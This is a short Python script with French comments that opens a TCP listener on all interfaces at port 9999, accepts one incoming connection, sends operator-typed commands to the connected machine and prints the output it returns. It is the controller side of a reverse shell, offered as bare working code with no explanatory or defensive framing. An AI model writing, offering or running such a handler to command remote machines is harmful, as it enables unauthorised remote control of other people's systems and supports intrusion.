import socket
import subprocess

host = '0.0.0.0'   # écoute sur toutes les interfaces
port = 9999        # port à ouvrir

server = socket.socket()
server.bind((host, port))
server.listen(1)
print(f"[+] En attente de connexion sur {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connexion établie depuis {addr}")

while True:
    cmd = input("Commande à envoyer: ")
    if cmd.lower() in ['exit', 'quit']:
        conn.send(cmd.encode())
        break
    conn.send(cmd.encode())
    output = conn.recv(4096).decode()
    print(output)

conn.close()

